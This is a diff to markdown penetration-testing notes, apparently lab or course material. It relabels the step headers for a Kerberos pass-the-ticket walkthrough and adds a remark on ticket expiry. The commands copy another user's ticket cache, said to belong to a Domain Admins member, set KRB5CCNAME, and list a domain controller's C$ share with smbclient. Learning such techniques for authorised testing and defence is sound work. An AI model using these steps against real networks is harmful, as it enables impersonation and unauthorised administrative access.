@@ -5129,7 +5129,7 @@ Julio is a member of the **Domain Admins** group. We can attempt to impersonate 
 
 To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
 
-**TITLE:**
+**List Kerberos Tickets:**
 
 ```bash
 klist
@@ -5141,19 +5141,19 @@ klist
 # klist: No credentials cache found (filename: /tmp/krb5cc_0)
 ```
 
-**TITLE:**
+**Copy Kerberos Ticket Cache File:**
 
 ```bash
 cp /tmp/krb5cc_647401106_I8I133 .
 ```
 
-**TITLE:**
+**Set Kerberos Cache Environment Variable:**
 
 ```bash
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133
 ```
 
-**TITLE:**
+**List Kerberos Tickets:**
 
 ```bash
 klist
@@ -5170,7 +5170,7 @@ klist
 #         renew until 10/08/2025 13:25:01
 ```
 
-**TITLE:**
+**Access SMB Share Using Kerberos Authentication:**
 
 ```bash
 smbclient //dc01/C$ -k -c ls -no-pass
@@ -5197,6 +5197,8 @@ smbclient //dc01/C$ -k -c ls -no-pass
 
 #                 7706623 blocks of size 4096. 4447612 blocks available
 ```
+
+> **NOTE:** `klist` displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
 
 </details>
 
